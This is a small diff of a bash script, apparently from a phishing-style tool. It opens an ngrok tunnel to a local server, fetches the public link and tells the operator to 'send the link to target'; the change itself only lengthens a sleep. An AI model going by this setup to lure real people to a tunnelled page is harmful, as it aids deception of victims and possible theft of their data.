@@ -43,7 +43,7 @@ sleep 2
 
 printf "\n \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m Starting ngrok port forwarding..."
 { ~/ngrok http 1234 > /dev/null 2>&1 & } || throwNgrok
-sleep 5
+sleep 8
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
 printf "\n\n \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to target :\e[0m\e[1;93m %s \n" $link
